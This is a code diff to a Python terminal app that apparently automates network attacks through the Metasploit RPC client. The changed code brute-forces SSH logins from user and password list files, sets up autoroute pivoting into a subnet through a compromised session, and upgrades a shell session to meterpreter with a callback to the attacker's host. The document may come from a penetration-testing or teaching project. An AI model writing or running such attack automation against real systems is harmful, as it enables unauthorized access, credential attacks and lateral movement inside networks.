@@ -245,11 +245,13 @@ class Tile2(Static):
             STATE["computers"][ip] = Computer()
             self.app.call_from_thread(self.parent.query_one(Tile4).rebuild_tree)
         usrlist = askopenfilename(title="Please chose a user list")
-        passlist = askopenfilename(title ="Please chose a password list")
-        if (usrlist == () or passlist == ()) :
+        passlist = askopenfilename(title="Please chose a password list")
+        if usrlist == () or passlist == ():
             usr, pwd = getSSH.getSshCredsAndConn(ip.split("/")[0])
-        else : 
-            usr, pwd = getSSH.getSshCredsAndConn(ip.split("/")[0],str(usrlist),str(passlist))
+        else:
+            usr, pwd = getSSH.getSshCredsAndConn(
+                ip.split("/")[0], str(usrlist), str(passlist)
+            )
         if not usr:
             self.app.call_from_thread(
                 self.parent.query_one("#logs", Pretty).update,
@@ -278,7 +280,7 @@ class Tile2(Static):
         client: MsfRpcClient = STATE["client"]
         autoroute = client.modules.use("post", "multi/manage/autoroute")
         shell_id = autopwn.findShellID(client, ip)
-        autoroute["SESSION"] = shell_id
+        autoroute["SESSION"] = int(shell_id)
         autoroute["SUBNET"] = network
         job = autoroute.execute()
         while len(client.jobs.list) != 0:
@@ -550,9 +552,16 @@ class ParamMenu(Static):
         while len(client.jobs.list) != 0:
             sleep(0.1)
         new_sessions = client.sessions.list
-        new_sess_id = [
+        new_sess = [
             element for element in new_sessions if element not in STATE["sessions"]
-        ][0]
+        ]
+        if len(new_sess) == 0:
+            self.app.call_from_thread(
+                self.app.query_one("#logs", Pretty).update,
+                "No session created, attack failed",
+            )
+            return
+        new_sess_id = new_sess[0]
 
         # upgrading session to meterpreter
         if new_sessions[new_sess_id]["type"] == "shell":
@@ -560,9 +569,14 @@ class ParamMenu(Static):
                 self.app.query_one("#logs", Pretty).update,
                 str(new_sessions) + " Upgrading shell to meterpreter...",
             )
-            shell = client.sessions.session(new_sess_id)
-            shell.upgrade(lhost="0.0.0.0", lport="5678")
-            shell.stop()
+            upgrade = client.modules.use("post", "multi/manage/shell_to_meterpreter")
+            upgrade["SESSION"] = int(new_sess_id)
+            upgrade["LHOST"] = ip_source_attack.split("/")[0]
+            job = upgrade.execute()
+            while len(client.jobs.list) != 0:
+                sleep(0.1)
+            client.sessions.session(new_sess_id).stop()
+            sleep(1)
             new_sessions = client.sessions.list
 
         # port forwarding
